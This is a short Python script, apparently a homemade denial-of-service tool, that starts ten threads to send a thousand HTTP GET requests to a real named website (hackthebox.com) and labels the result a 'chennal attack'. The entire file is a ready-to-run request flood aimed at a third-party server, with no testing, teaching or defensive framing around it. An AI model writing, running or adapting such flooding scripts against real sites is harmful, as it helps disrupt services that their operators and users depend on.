import requests
import threading

def chennal_attack(target_url, num_requests):
    for _ in range(num_requests):
        try:
            response = requests.get(target_url)
            print(f"Request sent to {target_url}. Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {target_url}: {e}")

def main():
    target_url = "https://www.hackthebox.com/"
    num_requests = 1000
    num_threads = 10

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=chennal_attack, args=(target_url, num_requests // num_threads))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print("Chennal attack completed.")

if __name__ == "__main__":
    main()